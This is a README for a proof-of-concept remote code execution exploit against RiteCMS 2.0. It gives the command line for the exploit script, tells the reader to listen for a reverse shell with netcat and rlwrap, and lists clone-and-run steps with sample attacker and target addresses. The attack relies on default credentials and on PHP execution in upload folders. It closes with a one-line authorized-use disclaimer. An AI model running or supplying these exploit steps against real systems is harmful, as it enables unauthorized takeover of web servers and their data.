# RiteCMS 2.0 Remote Code Execution PoC

This is a proof-of-concept for a **Remote Code Execution (RCE)** vulnerability in RiteCMS 2.0.

## Usage
```bash
python3 ritecms2.0-exploit.py -i <Your-IP> -t <Target-IP> -p <Port>
```

## Requirements
- Python 3.x
- `requests` library (`pip3 install requests`)
- Netcat (`nc`) and `rlwrap` for listening to the reverse shell

```bash
sudo apt install rlwrap netcat
pip3 install requests
```

## Steps to Reproduce
```bash
git clone https://github.com/x0root/RiteCMS-2.0-RCE-PoC
cd RiteCMS-2.0-RCE-PoC
python3 ritecms2.0-exploit.py -i 192.168.1.10 -t 192.168.1.20 -p 4444
```

## Notes
- Only works on RiteCMS 2.0 with default credentials.
- Ensure your environment allows PHP execution in uploaded directories.
- Use responsibly and only on systems you are authorized to test.
